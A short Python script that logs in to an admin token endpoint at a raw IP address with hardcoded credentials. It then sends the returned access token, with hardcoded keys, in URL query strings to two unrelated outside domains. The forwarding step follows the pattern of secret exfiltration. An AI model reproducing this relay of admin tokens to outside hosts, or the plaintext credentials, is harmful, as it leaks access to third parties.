import requests

url = 'http://46.250.249.209:8000/api/admin/token'
headers = {
    'accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded'
}

data = {
    'grant_type': '',
    'username': 'bezos',
    'password': '4896qwer',
    'scope': '',
    'client_id': '',
    'client_secret': ''
}

response = requests.post(url, headers=headers, data=data)
print(response.json())
if response.status_code == 200:
  requests.get(f'https://subconvert.t7xqp3r.life/api/v1/side/token?key={"Bme983G45K23^PKH"}&token={response.json()["access_token"]}')
  requests.get(f'https://zoomm.cloud/api/v1/zoommm/token?key={"^8qCyF54YL4x8c@c"}&token={response.json()["access_token"]}')
